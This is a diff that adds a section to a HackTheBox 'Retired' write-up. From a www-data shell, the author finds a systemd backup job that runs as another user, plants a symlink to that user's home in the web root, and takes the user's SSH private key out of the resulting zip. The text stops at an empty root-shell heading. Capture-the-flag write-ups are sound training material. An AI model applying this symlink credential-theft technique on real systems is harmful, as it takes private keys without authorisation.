@@ -5,6 +5,7 @@ categories: [HackTheBox]
 tags: [api]
 img_path: /assets/img/machine/retired/
 ---
+## Info
 
 ![Retired Machine Info](retired-machine-card.png)
 
@@ -459,3 +460,125 @@ We create our payload (`line 18`), we start the rop introducing the junk (`520 b
 For the final phase, all we do is push the address with the start of our payload into `rdi` and call system, which uses `rdi` as the first function parameter.
 
 We save the final result in a file, and use the functionality of the application that we had seen before to upload our file.
+
+## Getting user shell
+
+Ok, so now we have a shell as `www-data`, let's do some recon to see how we can scale to a normal user.
+
+```bash
+www-data@retired:~$ systemctl list-timers --all
+NEXT                        LEFT         LAST                        PASSED    UNIT                         ACTIVATES
+Tue 2022-08-16 18:59:00 UTC 54s left     Tue 2022-08-16 18:58:01 UTC 3s ago    website_backup.timer         website_backup.service
+Tue 2022-08-16 19:09:00 UTC 10min left   Tue 2022-08-16 18:39:01 UTC 19min ago phpsessionclean.timer        phpsessionclean.service
+Wed 2022-08-17 00:00:00 UTC 5h 1min left Tue 2022-08-16 09:29:07 UTC 9h ago    logrotate.timer              logrotate.service
+Wed 2022-08-17 00:00:00 UTC 5h 1min left Tue 2022-08-16 09:29:07 UTC 9h ago    man-db.timer                 man-db.service
+Wed 2022-08-17 04:08:04 UTC 9h left      Tue 2022-08-16 11:14:14 UTC 7h ago    apt-daily.timer              apt-daily.service
+Wed 2022-08-17 06:20:26 UTC 11h left     Tue 2022-08-16 09:31:27 UTC 9h ago    apt-daily-upgrade.timer      apt-daily-upgrade.service
+Wed 2022-08-17 09:44:06 UTC 14h left     Tue 2022-08-16 09:44:06 UTC 9h ago    systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+Sun 2022-08-21 03:10:49 UTC 4 days left  Tue 2022-08-16 09:29:47 UTC 9h ago    e2scrub_all.timer            e2scrub_all.service
+Mon 2022-08-22 01:38:35 UTC 5 days left  Tue 2022-08-16 10:43:47 UTC 8h ago    fstrim.timer                 fstrim.service
+
+9 timers listed.
+```
+{: .nolineno }
+
+Looking at the list of timers there is one that especially catches my attention `website_backup.service`, let's see what this service is doing.
+
+```bash
+www-data@retired:~$ systemctl cat website_backup.service
+# /etc/systemd/system/website_backup.service
+[Unit]
+Description=Backup and rotate website
+
+[Service]
+User=dev
+Group=www-data
+ExecStart=/usr/bin/webbackup
+
+[Install]
+WantedBy=multi-user.target
+```
+{: .nolineno }
+
+We can see that it is running `/usr/bin/webbackup`, let's see what it is and what it does.
+
+```bash
+www-data@retired:~$ cat /usr/bin/webbackup
+#!/bin/bash
+set -euf -o pipefail
+
+cd /var/www/
+
+SRC=/var/www/html
+DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
+
+/usr/bin/rm --force -- "$DST"
+/usr/bin/zip --recurse-paths "$DST" "$SRC"
+
+KEEP=10
+/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
+    | sort --zero-terminated --numeric-sort --reverse \
+    | while IFS= read -r -d '' backup; do
+        if [ "$KEEP" -le 0 ]; then
+            /usr/bin/rm --force -- "$backup"
+        fi
+        KEEP="$((KEEP-1))"
+    done
+```
+{: .nolineno }
+
+What this script does is to create a backup of the `/var/www/html folder`, we are going to create a symbolic link to the home folder of the dev user, which we can see that it exists by looking at the `/etc/passwd` file and see if we can list the home directory.
+
+```bash
+www-data@retired:~/html$ ls -la
+total 48
+drwxrwsrwx 5 www-data www-data  4096 Aug 16 19:06 .
+drwxrwsrwx 4 www-data www-data  4096 Aug 16 19:07 ..
+-rw-rwSrw- 1 www-data www-data   585 Oct 13  2021 activate_license.php
+drwxrwsrwx 3 www-data www-data  4096 Mar 11 14:36 assets
+-rw-rwSrw- 1 www-data www-data  4144 Mar 11 11:34 beta.html
+drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 css
+-rw-rwSrw- 1 www-data www-data 11414 Oct 13  2021 default.html
+lrwxrwxrwx 1 www-data www-data     9 Aug 16 19:06 home -> /home/dev
+-rw-rwSrw- 1 www-data www-data   348 Mar 11 11:29 index.php
+drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 js
+
+www-data@retired:~$ ls -la
+[...]
+-rw-r--r--  1 dev      www-data  529934 Aug 16 19:07 2022-08-16_19-07-01-html.zip
+
+www-data@retired:/tmp$ unzip 2022-08-16_19-07-01-html
+[...]
+ creating: var/www/html/home/
+extrcting: var/www/html/home/user.txt
+inflating: var/www/html/home/.bashrc
+ creating: var/www/html/home/.ssh/
+inflating: var/www/html/home/.ssh/id_rsa.pub
+inflating: var/www/html/home/.ssh/authorized_keys
+inflating: var/www/html/home/.ssh/id_rsa
+ creating: var/www/html/home/.local/
+ creating: var/www/html/home/.local/share/
+ creating: var/www/html/home/.local/share/nano/
+ creating: var/www/html/home/emuemu/
+ creating: var/www/html/home/emuemu/test/
+inflating: var/www/html/home/emuemu/test/examplerom
+inflating: var/www/html/home/emuemu/reg_helper
+inflating: var/www/html/home/emuemu/reg_helper.c
+inflating: var/www/html/home/emuemu/README.md
+inflating: var/www/html/home/emuemu/emuemu
+inflating: var/www/html/home/emuemu/emuemu.c
+inflating: var/www/html/home/emuemu/Makefile
+inflating: var/www/html/home/.profile
+inflating: var/www/html/home/.bash_logout
+ creating: var/www/html/home/activate_license/
+inflating: var/www/html/home/activate_license/activate_license.c
+inflating: var/www/html/home/activate_license/activate_license.service
+inflating: var/www/html/home/activate_license/Makefile
+inflating: var/www/html/home/activate_license/activate_license
+[...]
+```
+{: .nolineno }
+
+The backup has been created correctly, and when extracting it we can see the home directory of the user, now we already have the ssh key, so we download it and login into the machine as the user `dev`.
+
+## Getting root shell
